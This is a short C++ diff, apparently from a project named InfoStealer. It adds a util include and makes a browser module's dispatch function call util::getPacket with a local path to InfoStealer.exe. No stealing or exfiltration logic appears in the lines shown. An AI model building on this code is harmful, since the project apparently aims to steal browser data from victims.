@@ -12,6 +12,7 @@
 
 
 #include "../../../include/modules/browser/browser.hpp"
+#include "../../../include/util/util.hpp"
 
 browser::browser() {
 
@@ -22,6 +23,6 @@ browser::~browser() {
 }
 
 void browser::dispatch() {
-
+	util::getPacket("C:\\Users\\hasch\\source\\repos\\InfoStealer\\x64\\Debug\\InfoStealer.exe");
 }
 
